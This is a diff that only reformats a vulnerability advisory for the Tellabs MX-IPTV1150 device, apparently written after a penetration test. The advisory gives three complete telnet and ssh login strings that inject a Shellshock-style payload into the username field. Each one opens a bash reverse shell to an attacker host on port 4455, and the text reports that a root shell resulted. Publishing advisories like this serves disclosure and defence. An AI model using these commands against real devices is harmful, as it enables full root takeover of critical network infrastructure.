@@ -5,33 +5,33 @@ During a recent penetration test, a vulnerability in the way Tellabs handles inc
 
 [Product]
 
-	Vendor: Tellabs
+Vendor: Tellabs
 
-	Model: MX-IPTV1150
+Model: MX-IPTV1150
 
-	System Version: FP29.2_015873
+System Version: FP29.2_015873
 
-	Release: ONT709.2.50.12
+Release: ONT709.2.50.12
 
-	Date: 180722
+Date: 180722
 
 Steps to reproduce were rather simple, and based on the older Telnet "ShellShock" vulnerability.
 
 It's known that the following methods all produced a netcat reverse shell as root:
 Steps used to exploit:
 
-telnet [OLTHOSTNAME] -l ";EOF() { :;}; /usr/bin/id & /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
+	telnet [OLTHOSTNAME] -l ";EOF() { :;}; /usr/bin/id & /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
 	
-	The above command asked for the username within the telnet session, and when it timed out, produced the output: "uid=0(emsuser) gid=0(root)" showing that the second portion of the command was not parsed, and the system was vulnerable.
+The above command asked for the username within the telnet session, and when it timed out, produced the output: "uid=0(emsuser) gid=0(root)" showing that the second portion of the command was not parsed, and the system was vulnerable.
 
-telnet [OLTHOSTNAME] -l "() { :;}; $((/bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1)) /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
+	telnet [OLTHOSTNAME] -l "() { :;}; $((/bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1)) /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
 	
-	The above command was run and produced a reverse 'netcat' style shell to the attacker IP address with a full root bash shell. Again, suspect the second portion of the command was unnecessary, but due to time constraints, was unable to test further.
+The above command was run and produced a reverse 'netcat' style shell to the attacker IP address with a full root bash shell. Again, suspect the second portion of the command was unnecessary, but due to time constraints, was unable to test further.
 
 
-ssh [OLTHOSTNAME] -l "''; /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
+	ssh [OLTHOSTNAME] -l "''; /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
 	
-	After 3 failed authentication attempts the connect back to the netcat listener occurs and you are dropped in a root shell. (Contributed by Sandia National Laboratory)
+After 3 failed authentication attempts the connect back to the netcat listener occurs and you are dropped in a root shell. (Contributed by Sandia National Laboratory)
 
 
 Due to customer concerns with the critical nature of the networking infrastructure, further testing beyond the above was not possible, and the customer immediately contacted the vendor to work on a patch.
